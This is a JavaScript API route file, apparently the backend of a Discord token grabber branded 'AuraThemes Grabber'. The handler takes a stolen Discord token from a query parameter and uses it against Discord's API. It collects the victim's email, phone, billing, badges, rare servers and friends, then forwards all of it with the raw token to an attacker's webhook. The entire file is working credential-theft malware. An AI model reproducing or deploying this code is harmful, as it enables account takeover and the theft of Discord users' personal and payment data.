import { EmbedBuilder, WebhookClient } from 'discord.js';
import getDiscordInfo from '../../../utils/functions.cjs';
import k4itrunConfig from '../../../../k4itrun.config';

const webhook = new WebhookClient({
  url: k4itrunConfig.webhook,
});

const EMBED_COLORS = {
  raw: '#c267ff',
  grab: '#c267ff',
};

const getField = (name = '-', value = '-', inline = false) => ({ name, value, inline });

const embedGrabber = (guilds, friends, infos, token, embed) => new EmbedBuilder()
  .setAuthor({ name: `${infos.username} | ${infos.ID}`, iconURL: infos.avatar })
  .setThumbnail(infos.avatar)
  .setColor(EMBED_COLORS.grab)
  .setTitle('AuraThemes Dualhooked - 6889.fun')
  .addFields(
    getField('<a:aura:1087044506542674091> Token:', `\`\`\`${token}\`\`\``, false),
    getField('<a:aura:1101739920319590420> Nitro:', infos.nitroType, true),
    getField('<a:aura:863691953531125820> Phone', `\`${infos.phone}\``, true),
    getField('<:aura:974711605927505990> Email', `\`${infos.mail}\``, false),
    getField('Badges', infos.badges, true),
    getField('Billing', infos.billing, true),
    getField('Langue', infos.langue, true),
    getField('\u200b', '**Rare Servers**\n' + guilds, true),
    getField('\u200b', "\u200b", false),
    getField('\u200b', '**Rare Friends**\n' + friends, true)
  )
  .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
  .setTimestamp();

const embedRaw = (token, embed) => new EmbedBuilder()
  .setAuthor({ name: 'AuraThemes' })
  .setColor(EMBED_COLORS.raw)
  .setTitle('raw')
  .addFields(getField('New visit lmao', `\`\`\`${token}\`\`\``))
  .setFooter({ text: 'AuraThemes API', iconURL: embed.footericon })
  .setTimestamp();

const getEmbed = async () => ({
  avatar: 'https://i.imgur.com/WkKXZSl.gif',
  url: 'https://discord.gg/aurathemes',
  footericon: 'https://i.imgur.com/WkKXZSl.gif',
});

export default async function handler(req, res) {
  try {
    const { query } = req;
    if (!query.data) {
      res.status(400).send('Bad Request: Missing "data" query parameter.');
      return;
    }

    const { data } = query;
    const token = data;
    const embed = await getEmbed();
    const response = await fetch('https://discord.com/api/v9/users/@me', {
      headers: {
        authorization: token,
      },
    });

    const info = await response.json();
    console.log(info);

    const infos = getDiscordInfo(token).all;
    const guilds = getDiscordInfo(token).guilds.rares;
    const friends = getDiscordInfo(token).friends.rares;
    const embedBuilder = (infos?.ID || infos.ID)
      ? embedGrabber(guilds, friends, infos, token, embed)
      : embedRaw(token, embed);

    await webhook.send({
      embeds: [embedBuilder],
      username: '@AuraThemes',
      avatarURL: embed.avatar,
    });

    res.status(200).send(data);
  } catch (e) {
    console.error('Error:', e);
    res.status(500).send('Internal Server Error');
  }
}
